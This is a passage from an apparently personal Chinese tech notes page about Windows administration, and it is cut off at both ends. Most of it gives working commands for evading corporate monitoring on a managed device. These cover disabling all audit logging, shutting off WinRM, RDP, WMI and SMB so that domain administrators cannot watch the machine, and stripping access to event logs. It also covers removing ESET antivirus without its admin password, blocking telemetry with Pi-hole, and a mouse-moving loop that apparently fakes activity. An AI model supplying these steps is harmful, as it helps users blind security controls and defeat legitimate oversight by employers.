<li>按下 Win + R，输入 gpedit.msc，然后按 Enter。</li>
</ul>
</li>
<li>导航到审计策略：<ul>
<li>路径：计算机配置 → Windows 设置 → 安全设置 → 本地策略 → 审核策略。</li>
</ul>
</li>
<li>禁用所需的审计项：<ul>
<li>在右侧面板中找到需要禁用的审计项（例如登录审核、对象访问审核、进程创建审核等）。</li>
<li>双击需要禁用的项，在弹出的窗口中选择不审核，然后点击确定。</li>
</ul>
</li>
<li>应用更改：<ul>
<li>关闭组策略编辑器，重启计算机或运行以下命令以使更改生效：</li>
</ul>
</li>
</ol>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure>

<h4 id="方法-2：使用命令行工具禁用本地审计"><a href="#方法-2：使用命令行工具禁用本地审计" class="headerlink" title="方法 2：使用命令行工具禁用本地审计"></a>方法 2：使用命令行工具禁用本地审计</h4><p>可以使用 auditpol 命令来禁用特定的审计策略。</p>
<ul>
<li>查看当前的审计策略</li>
</ul>
<p>在命令提示符或 PowerShell 中，运行以下命令查看当前的审计策略：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditpol /get /category:*</span><br></pre></td></tr></table></figure>

<ul>
<li>禁用特定审计项</li>
</ul>
<p>要禁用特定审计项（例如登录&#x2F;注销类别下的所有审核），可以使用以下命令：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditpol /<span class="built_in">set</span> /category:&quot;Logon/Logoff&quot; /success:disable /failure:disable</span><br></pre></td></tr></table></figure>

<ul>
<li>禁用所有审计项</li>
</ul>
<p>要禁用所有审计类别的审计，可以逐项禁用，或者使用批处理命令：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f &quot;tokens=*&quot; %a <span class="keyword">in</span> (&#x27;auditpol /get /category:* ^| <span class="built_in">findstr</span> /r &quot;^[A-Z]&quot;&#x27;) <span class="keyword">do</span> auditpol /<span class="built_in">set</span> /category:&quot;%a&quot; /success:disable /failure:disable</span><br></pre></td></tr></table></figure>

<ul>
<li>注意事项</li>
</ul>
<ol>
<li>权限要求：<ul>
<li>修改审计策略需要管理员权限，请确保在具有管理员权限的账户下执行这些操作。</li>
</ul>
</li>
<li>安全风险：<ul>
<li>禁用本地审计会使系统无法记录安全事件和用户活动，可能导致安全风险，降低问题排查和安全合规性。</li>
</ul>
</li>
<li>重新启用审计：<ul>
<li>如果需要重新启用本地审计，可以通过组策略编辑器将相关项设置为成功审核或失败审核，或者使用 auditpol 命令启用。</li>
</ul>
</li>
</ol>
<p>示例命令重新启用审计：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditpol /<span class="built_in">set</span> /category:&quot;Logon/Logoff&quot; /success:enable /failure:enable</span><br></pre></td></tr></table></figure>

<p>通过这些方法，可以有效控制本地审计的启用和禁用。</p>
<h2 id="禁用-Windows-远程管理"><a href="#禁用-Windows-远程管理" class="headerlink" title="禁用 Windows 远程管理"></a>禁用 Windows 远程管理</h2><p>Windows 远程管理涉及多个功能，如 <strong>PowerShell 远程</strong>、<strong>远程桌面</strong> 和 <strong>Windows 远程管理服务</strong> (<strong>WinRM</strong>)。您可以逐一禁用这些功能。</p>
<h3 id="禁用-PowerShell-远程"><a href="#禁用-PowerShell-远程" class="headerlink" title="禁用 PowerShell 远程"></a>禁用 PowerShell 远程</h3><p>在 <strong>PowerShell</strong> 中运行以下命令来禁用 PowerShell 远程功能：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Disable-PSRemoting</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<h3 id="禁用远程桌面-RDP"><a href="#禁用远程桌面-RDP" class="headerlink" title="禁用远程桌面 (RDP)"></a>禁用远程桌面 (RDP)</h3><ol>
<li><p><strong>通过设置禁用远程桌面：</strong></p>
<ul>
<li>按 <code>Win + I</code> 打开 <strong>设置</strong>。</li>
<li>选择 <strong>系统</strong> -&gt; <strong>远程桌面</strong>。</li>
<li>将 <strong>启用远程桌面</strong> 选项关闭。</li>
</ul>
</li>
<li><p><strong>通过命令提示符禁用远程桌面：</strong><br>打开命令提示符（管理员权限），运行以下命令：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="number">1</span> /f</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>停止远程桌面服务：</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop TermService</span><br><span class="line">sc config TermService <span class="built_in">start</span>= disabled</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="禁用-Windows-Management-Instrumentation-WMI"><a href="#禁用-Windows-Management-Instrumentation-WMI" class="headerlink" title="禁用 Windows Management Instrumentation (WMI)"></a>禁用 Windows Management Instrumentation (WMI)</h3><p>PowerShell Remoting 依赖于 WMI（Windows Management Instrumentation）来查询计算机的状态。禁用 WMI 服务可以防止通过 WMI 查询用户和权限。</p>
<p>在 PowerShell 中执行以下命令禁用 WMI 服务：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Stop-Service</span> <span class="literal">-Name</span> winmgmt</span><br><span class="line"><span class="built_in">Set-Service</span> <span class="literal">-Name</span> winmgmt <span class="literal">-StartupType</span> Disabled</span><br></pre></td></tr></table></figure>

<p>或者，在 <strong>服务管理器</strong> 中手动禁用 <code>Windows Management Instrumentation</code> 服务。</p>
<h3 id="如何检查和设置-WMI-权限："><a href="#如何检查和设置-WMI-权限：" class="headerlink" title="如何检查和设置 WMI 权限："></a>如何检查和设置 WMI 权限：</h3><ul>
<li>可使用 Component Services 或 WMI Control 控制台来查看和配置 WMI 的访问权限。</li>
<li>步骤：<ol>
<li>打开 compmgmt.msc（计算机管理）。</li>
<li>导航到 Services and Applications &gt; WMI Control。</li>
<li>右键点击 WMI Control，选择 Properties。</li>
<li>在 Security 选项卡中，可以查看和配置 WMI 命名空间的权限。</li>
</ol>
</li>
</ul>
<h3 id="禁用-SMB-协议"><a href="#禁用-SMB-协议" class="headerlink" title="禁用 SMB 协议"></a>禁用 SMB 协议</h3><p>为了防止远程查看和管理，可以禁用 <strong>Server Message Block (SMB)</strong> 协议。</p>
<p>禁用 <strong>SMB1 协议</strong>和 <strong>SMB2 协议</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-SmbServerConfiguration</span> <span class="literal">-EnableSMB1Protocol</span> <span class="variable">$false</span></span><br><span class="line"><span class="built_in">Set-SmbServerConfiguration</span> <span class="literal">-EnableSMB2Protocol</span> <span class="variable">$false</span></span><br></pre></td></tr></table></figure>

<h3 id="禁用-WinRM-服务（远程管理服务）"><a href="#禁用-WinRM-服务（远程管理服务）" class="headerlink" title="禁用 WinRM 服务（远程管理服务）"></a>禁用 WinRM 服务（远程管理服务）</h3><p>在命令提示符或 PowerShell 中，运行以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止 WinRM 服务</span></span><br><span class="line"><span class="built_in">Stop-Service</span> WinRM</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用 WinRM 服务开机启动</span></span><br><span class="line"><span class="built_in">Set-Service</span> <span class="literal">-Name</span> WinRM <span class="literal">-StartupType</span> Disabled</span><br></pre></td></tr></table></figure>

<h3 id="配置防火墙规则"><a href="#配置防火墙规则" class="headerlink" title="配置防火墙规则"></a>配置防火墙规则</h3><p>通过配置防火墙规则，可以阻止来自特定 IP 或网络的远程访问。</p>
<ul>
<li>手动创建防火墙端口规则：</li>
</ul>
<p>通过防火墙限制远程连接，特别是禁用 <strong>PowerShell Remoting</strong> 或 <strong>WMI</strong> 查询：</p>
<ol>
<li>打开 <strong>Windows 防火墙</strong>。</li>
<li>创建新的出站或入站规则，阻止端口 <code>5985</code> (HTTP) 和 <code>5986</code> (HTTPS)，这两个端口是 PowerShell Remoting 和 WMI 查询的默认端口。</li>
</ol>
<ul>
<li>通过执行命令，配置阻止远程管理端口的规则。</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;Block PowerShell Remoting&quot;</span> <span class="literal">-Direction</span> Inbound <span class="literal">-Protocol</span> TCP <span class="literal">-LocalPort</span> <span class="number">5985</span>,<span class="number">5986</span> <span class="literal">-Action</span> Block</span><br></pre></td></tr></table></figure>

<ul>
<li>通过执行命令，配置阻止 RDP（远程桌面协议）端口的规则。</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;Block RDP&quot;</span> <span class="literal">-Direction</span> Inbound <span class="literal">-Protocol</span> TCP <span class="literal">-LocalPort</span> <span class="number">3389</span> <span class="literal">-Action</span> Block</span><br></pre></td></tr></table></figure>

<h3 id="禁用-Remote-Registry-服务"><a href="#禁用-Remote-Registry-服务" class="headerlink" title="禁用 Remote Registry 服务"></a>禁用 <code>Remote Registry</code> 服务</h3><p><code>Remote Registry</code> 服务允许远程计算机访问本地注册表，进而查看用户和权限信息。<br>禁用 <code>Remote Registry</code> 服务可以防止远程用户访问计算机的注册表，查看或修改用户信息、权限等。</p>
<ol>
<li>打开 <strong>服务管理器</strong>，找到 <strong>Remote Registry</strong> 服务。</li>
<li>禁用该服务，并将启动类型设置为 <strong>禁用</strong>。</li>
</ol>
<p>或者，你可以在 PowerShell 中执行以下命令禁用服务：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Stop-Service</span> <span class="literal">-Name</span> RemoteRegistry</span><br><span class="line"><span class="built_in">Set-Service</span> <span class="literal">-Name</span> RemoteRegistry <span class="literal">-StartupType</span> Disabled</span><br></pre></td></tr></table></figure>

<h3 id="隔离日志文件"><a href="#隔离日志文件" class="headerlink" title="隔离日志文件"></a>隔离日志文件</h3><p>Windows 的系统级事件日志保存在：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\winevt\Logs\System.evtx</span><br></pre></td></tr></table></figure>

<p>只要让远程进程无法读取这个文件，也能阻止信息泄漏：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\Windows\System32\winevt\Logs\System.evtx /inheritance:<span class="built_in">r</span> /remove <span class="string">&quot;NT AUTHORITY\NETWORK SERVICE&quot;</span></span><br></pre></td></tr></table></figure>

<p>这会阻断大部分远程采集。</p>
<h3 id="使用组策略限制权限"><a href="#使用组策略限制权限" class="headerlink" title="使用组策略限制权限"></a>使用组策略限制权限</h3><p>通过 <strong>组策略</strong>（GPO）来限制域管理员的远程访问权限，禁止某些账户或组执行特定操作。</p>
<ul>
<li>禁止远程管理</li>
</ul>
<ol>
<li>打开 <strong>组策略编辑器</strong>（<code>gpedit.msc</code>）。</li>
<li>导航到 <strong>计算机配置</strong> -&gt; <strong>管理模板</strong> -&gt; <strong>Windows 组件</strong> -&gt; <strong>Windows PowerShell</strong>。</li>
<li>启用 <strong>禁用远程脚本</strong> 策略，以防止通过 PowerShell 远程执行脚本。</li>
</ol>
<ul>
<li>限制管理员权限</li>
</ul>
<p>你还可以限制某些管理员的权限，限制其在目标计算机上的操作。通过组策略，你可以定义哪些用户组可以执行管理任务。</p>
<h3 id="禁用登录脚本和远程任务"><a href="#禁用登录脚本和远程任务" class="headerlink" title="禁用登录脚本和远程任务"></a>禁用登录脚本和远程任务</h3><p>禁用目标计算机的登录脚本和计划任务可以防止域管理员通过这些方式远程监视计算机。</p>
<ul>
<li>禁用计划任务</li>
</ul>
<ol>
<li>打开 <strong>任务计划程序</strong>。</li>
<li>禁用或删除与远程监控相关的计划任务。</li>
</ol>
<h2 id="卸载或禁用-ESET-Security"><a href="#卸载或禁用-ESET-Security" class="headerlink" title="卸载或禁用 ESET Security"></a>卸载或禁用 ESET Security</h2><p>ESET Security 是防病毒和安全保护软件，禁用或卸载它需要一定的步骤和权限，特别是在企业环境中可能会受到策略限制。<br>如果您没有 <strong>ESET Security</strong> 的管理员密码，但需要禁用或卸载它，可以尝试以下方法。不过请注意，在公司设备上这样做可能违反 IT 政策，需谨慎操作。</p>
<h3 id="方法-1-使用-ESET-卸载工具（在安全模式下）"><a href="#方法-1-使用-ESET-卸载工具（在安全模式下）" class="headerlink" title="方法 1: 使用 ESET 卸载工具（在安全模式下）"></a>方法 1: 使用 ESET 卸载工具（在安全模式下）</h3><p>ESET 提供了专门的卸载工具，可以在 <strong>安全模式</strong> 下强制卸载 ESET Security，绕过管理员密码。</p>
<h4 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h4><ol>
<li><p><strong>下载 ESET Uninstaller 工具：</strong></p>
<ul>
<li>从 ESET 官方支持页面下载 <strong>ESET Uninstaller</strong> 工具：<br><a target="_blank" rel="noopener" href="https://support.eset.com/en/kb2289-uninstall-eset-manually-using-the-eset-uninstaller-tool">ESET Uninstaller 下载链接</a></li>
</ul>
</li>
<li><p><strong>进入安全模式：</strong></p>
<ul>
<li>按 <code>Win + R</code>，输入 <code>msconfig</code>，按回车。</li>
<li>在 <strong>引导</strong> 选项卡中，勾选 <strong>安全引导</strong>，然后点击 <strong>确定</strong> 并重启电脑。</li>
</ul>
</li>
<li><p><strong>运行 ESET Uninstaller 工具：</strong></p>
<ul>
<li>在安全模式下，运行下载的 <strong>ESET Uninstaller</strong> 工具 (<code>ESETUninstaller.exe</code>)。</li>
<li>按照提示，输入确认信息并选择要卸载的 ESET 产品。</li>
<li>等待卸载完成。</li>
</ul>
</li>
<li><p><strong>重新启动电脑</strong>：</p>
<ul>
<li>卸载完成后，重新启动电脑并返回正常模式。</li>
<li>记得取消 <strong>安全引导</strong> 选项（在 <code>msconfig</code> 中取消勾选 <strong>安全引导</strong>）。</li>
</ul>
</li>
</ol>
<h3 id="方法-2-通过注册表重置-ESET-管理员密码"><a href="#方法-2-通过注册表重置-ESET-管理员密码" class="headerlink" title="方法 2: 通过注册表重置 ESET 管理员密码"></a>方法 2: 通过注册表重置 ESET 管理员密码</h3><p>您可以尝试通过修改注册表来重置或移除 ESET Security 的管理员密码。</p>
<h4 id="步骤：-1"><a href="#步骤：-1" class="headerlink" title="步骤："></a>步骤：</h4><ol>
<li><p><strong>打开注册表编辑器：</strong></p>
<ul>
<li>按 <code>Win + R</code>，输入 <code>regedit</code>，然后按回车。</li>
</ul>
</li>
<li><p><strong>定位到 ESET 密码存储路径：</strong></p>
<ul>
<li>路径：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET Security\CurrentVersion\Info</span><br></pre></td></tr></table></figure></li>
<li>在部分版本中，路径可能略有不同。</li>
</ul>
</li>
<li><p><strong>删除密码值：</strong></p>
<ul>
<li>找到名为 <strong><code>Password</code></strong> 或 <strong><code>AdminPassword</code></strong> 的项。</li>
<li>右键点击该项，选择 <strong>删除</strong>。</li>
<li>关闭注册表编辑器。</li>
</ul>
</li>
<li><p><strong>重启电脑</strong>：</p>
<ul>
<li>重启后，尝试打开 ESET Security，密码应该被移除。</li>
</ul>
</li>
</ol>
<h3 id="方法-3-通过任务管理器禁用-ESET-启动项和服务"><a href="#方法-3-通过任务管理器禁用-ESET-启动项和服务" class="headerlink" title="方法 3: 通过任务管理器禁用 ESET 启动项和服务"></a>方法 3: 通过任务管理器禁用 ESET 启动项和服务</h3><ol>
<li><p><strong>打开任务管理器：</strong></p>
<ul>
<li>按 <code>Ctrl + Shift + Esc</code>。</li>
</ul>
</li>
<li><p><strong>禁用启动项：</strong></p>
<ul>
<li>转到 <strong>启动</strong> 选项卡。</li>
<li>找到 <strong>ESET Security</strong>，右键点击并选择 <strong>禁用</strong>。</li>
</ul>
</li>
<li><p><strong>禁用 ESET 服务：</strong></p>
<ul>
<li>转到 <strong>服务</strong> 选项卡。</li>
<li>找到所有与 ESET 相关的服务，右键点击，选择 <strong>停止</strong>。</li>
<li>按 <code>Win + R</code>，输入 <code>services.msc</code>，回车。</li>
<li>在服务列表中找到 <strong>ESET 服务</strong>，右键选择 <strong>属性</strong>，将 <strong>启动类型</strong> 设置为 <strong>禁用</strong>。</li>
</ul>
</li>
</ol>
<h2 id="让-Chromium-使用系统托盘运行（第三方工具）"><a href="#让-Chromium-使用系统托盘运行（第三方工具）" class="headerlink" title="让 Chromium 使用系统托盘运行（第三方工具）"></a>让 Chromium 使用系统托盘运行（第三方工具）</h2><p>Windows 本身不支持直接将 <a target="_blank" rel="noopener" href="https://www.chromium.org/getting-involved/download-chromium/#not-as-easy-steps">Chromium</a> 或者 <a target="_blank" rel="noopener" href="https://vivaldi.com/">Vivaldi</a> 移动到托盘（右下角通知区域）。但可以使用第三方工具，如 <strong>RBTray</strong> 或 <strong>TrayIt</strong>!，将 Chromium 最小化到系统托盘中：</p>
<ol>
<li>下载并运行 <a target="_blank" rel="noopener" href="https://rbtray.sourceforge.net/">RBTray</a>（无需安装）。</li>
<li>打开 Chromium 后，用右键单击窗口右上角的最小化按钮。</li>
<li>Chromium 图标将最小化到托盘。</li>
</ol>
<p>查看 Microsoft Purview 扩展 和 Microsoft Single Sign-On (SSO) 插件在 Chrome 浏览器中何时部署：</p>
<ol>
<li>打开以下目录：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions</span><br></pre></td></tr></table></figure></li>
<li>找到扩展的文件夹（通过扩展程序 ID）。<ul>
<li>你可以在 <code>chrome://extensions/</code> 页面中找到扩展 ID。</li>
</ul>
</li>
<li>右键扩展文件夹，选择 <strong>属性</strong>。</li>
<li>在 <strong>创建时间</strong> 中查看扩展的初始安装时间。</li>
</ol>
<p>让 iPhone 通过 USB 分享网络给 Windows 11：</p>
<ul>
<li>安装 <a target="_blank" rel="noopener" href="https://github.com/koush/AppleMobileDeviceSupport/releases/tag/v14.5.0.7"><strong>AppleMobileDeviceSupport</strong></a> 。</li>
<li>打开 <strong>控制面板</strong> → <strong>网络和共享中心</strong> → <strong>更改适配器设置</strong>。</li>
<li>你应该能够看到 <strong>Apple Mobile Device Ethernet</strong> 或类似名称的适配器，这表示 iPhone 正在通过 USB 共享网络。</li>
<li>如果看到该适配器，右键点击它并选择 <strong>启用</strong>。</li>
</ul>
<p>使用 <a target="_blank" rel="noopener" href="https://mypublicwifi.com/">MyPublicWiFi</a> 创建虚拟无线路由器：</p>
<ul>
<li>特点：<ul>
<li>提供创建无线局域网和网络监控功能。</li>
<li>无需依赖 Hosted Network 支持。</li>
</ul>
</li>
<li>适用情况：<ul>
<li>支持较旧的 Windows 系统和大部分无线网卡。</li>
</ul>
</li>
</ul>
<p>在 <strong>Windows 11</strong> 中开启<strong>移动热点</strong>：</p>
<ol>
<li>按下 <strong>Win + I</strong> 打开设置，或者点击<strong>开始菜单</strong>，选择<strong>设置</strong>。</li>
<li>在设置界面，选择左侧菜单中的<strong>网络和互联网</strong>。</li>
<li>在<strong>网络和互联网</strong>页面中，找到并点击<strong>移动热点</strong>。</li>
<li><strong>选择网络连接来源</strong>：<ul>
<li>在<strong>共享我的互联网连接</strong>下拉菜单中，选择用于共享的网络连接来源（例如 Wi-Fi 或以太网）。</li>
</ul>
</li>
<li><strong>配置网络名称和密码（可选）</strong>：<ul>
<li>点击<strong>编辑</strong>按钮，设置你的热点名称（SSID）和密码。确保密码满足至少8位字符的要求。</li>
</ul>
</li>
<li>将<strong>移动热点</strong>开关切换到<strong>开</strong>的状态。</li>
<li>系统会显示热点的网络名称和密码，你可以使用其他设备连接到此热点。</li>
<li>在移动热点设置页面，可以查看并管理连接到热点的设备。</li>
</ol>
<p>使用 <a target="_blank" rel="noopener" href="https://github.com/DesktopECHO/Pi-Hole-for-WSL1/tree/master">Pi-Hole-for-WSL1</a> 阻塞网络监控通信：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pihole -b self.events.data.microsoft.com</span><br><span class="line">pihole -b teams.events.data.microsoft.com</span><br><span class="line">pihole -b browser-intake-datadoghq.com</span><br><span class="line">pihole -b dns.msftncsi.com</span><br><span class="line">pihole -b msftconnecttest.com</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pihole reloaddns</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pihole -t</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /flushdns</span><br><span class="line">nslookup &lt;域名&gt; &lt;DNS服务器IPv4地址&gt;</span><br><span class="line">nslookup &lt;域名&gt; &lt;DNS服务器IPv6地址&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有允许的端口 53 规则</span></span><br><span class="line">netsh advfirewall firewall show rule name=all | findstr <span class="string">&quot;53&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许 UDP 53</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Allow DNS UDP&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=UDP localport=<span class="number">53</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许 TCP 53</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Allow DNS TCP&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">53</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许 Pi-hole Web</span></span><br><span class="line"><span class="built_in">New-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;Pi-hole Web&quot;</span> <span class="literal">-Direction</span> Inbound <span class="literal">-Action</span> Allow <span class="literal">-Protocol</span> TCP <span class="literal">-LocalPort</span> <span class="number">60080</span></span><br></pre></td></tr></table></figure>

<h2 id="dnsdist-的-postresolve-钩子"><a href="#dnsdist-的-postresolve-钩子" class="headerlink" title="dnsdist 的 postresolve 钩子"></a><a target="_blank" rel="noopener" href="https://github.com/PowerDNS/pdns">dnsdist</a> 的 postresolve 钩子</h2><p>监听 Windows 共享 Wi-Fi 的局域网 IP:53，作为客户端入口。</p>
<ol>
<li>客户端请求域名查询 → DNS Proxy</li>
<li>DNS Proxy 将域名查询转发到上游 DNS 服务器或者 Pi‑hole（WSL 内 127.0.0.1:53 <a target="_blank" rel="noopener" href="https://thekelleys.org.uk/gitweb/?p=dnsmasq.git">dnsmasq</a>）</li>
<li>上游 DNS 服务器返回 IP</li>
<li>DNS Proxy 将返回的 IP 加入 Windows 防火墙 &#x2F; NAT 白名单</li>
<li>DNS Proxy 再把 IP 返回给客户端</li>
</ol>
<p>Mac mini M4 Pro + UTM + Ubuntu Router VM + dnsdist + ipset + iptables<br>Windows 11 + Hyper-V + Ubuntu Router VM + dnsdist + ipset + iptables</p>
<br />

<p><strong>nftables 等价配置</strong></p>
<p>创建 nftables 表、集合、链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">table inet filter &#123;</span><br><span class="line"></span><br><span class="line">  # === 等价于 ipset whitelist ===</span><br><span class="line">  set whitelist &#123;</span><br><span class="line">    type ipv4_addr</span><br><span class="line">    flags interval</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  # === forward 链（等价于 iptables FORWARD）===</span><br><span class="line">  chain forward &#123;</span><br><span class="line">    type filter hook forward priority 0;</span><br><span class="line">    policy drop;</span><br><span class="line"></span><br><span class="line">    # 白名单命中 → 记录 + 放行</span><br><span class="line">    ip saddr @whitelist \</span><br><span class="line">      limit rate 10/second burst 50 packets \</span><br><span class="line">      log prefix &quot;[ACCEPT] &quot; level info \</span><br><span class="line">      accept</span><br><span class="line"></span><br><span class="line">    # 未命中白名单 → 记录 + 丢弃</span><br><span class="line">    limit rate 5/second burst 20 packets \</span><br><span class="line">      log prefix &quot;[DROP] &quot; level info \</span><br><span class="line">      drop</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⚠️ 说明</p>
<ul>
<li><code>inet</code>：同时适用于 IPv4 &#x2F; IPv6（你现在先用 IPv4）</li>
<li><code>policy drop</code>：默认拒绝，等价于你之前最后的 <code>DROP</code></li>
</ul>
<br />

<p><strong>最小 dnsdist 示例</strong></p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setLocal(<span class="string">&#x27;0.0.0.0:53&#x27;</span>)</span><br><span class="line">newServer(&#123;address=<span class="string">&quot;1.1.1.1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">addAction(AllRule(), LuaAction(<span class="function"><span class="keyword">function</span><span class="params">(dq)</span></span></span><br><span class="line">  <span class="keyword">for</span> _, ip <span class="keyword">in</span> <span class="built_in">ipairs</span>(dq:getIPs() <span class="keyword">or</span> &#123;&#125;) <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;nft add element inet filter whitelist &#123; &quot;</span>..ip..<span class="string">&quot; &#125; 2&gt;/dev/null&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> DNSAction.None</span><br><span class="line"><span class="keyword">end</span>))</span><br></pre></td></tr></table></figure>

<h2 id="圆周运动"><a href="#圆周运动" class="headerlink" title="圆周运动"></a>圆周运动</h2><div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span>%%bash
pip<span class="w"> </span>install<span class="w"> </span>pyautogui
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">pyautogui</span>
<span class="kn">import</span> <span class="nn">math</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="c1"># 圆周运动的参数</span>
<span class="n">radius</span> <span class="o">=</span> <span class="mi">100</span>  <span class="c1"># 圆的半径</span>
<span class="n">center_x</span><span class="p">,</span> <span class="n">center_y</span> <span class="o">=</span> <span class="n">pyautogui</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="o">.</span><span class="n">width</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">pyautogui</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="o">.</span><span class="n">height</span> <span class="o">//</span> <span class="mi">2</span>  <span class="c1"># 屏幕中心点</span>
<span class="n">angle_step</span> <span class="o">=</span> <span class="mi">5</span>  <span class="c1"># 每步移动的角度增量，单位是度</span>

<span class="c1"># 进入无限循环</span>
<span class="k">try</span><span class="p">:</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
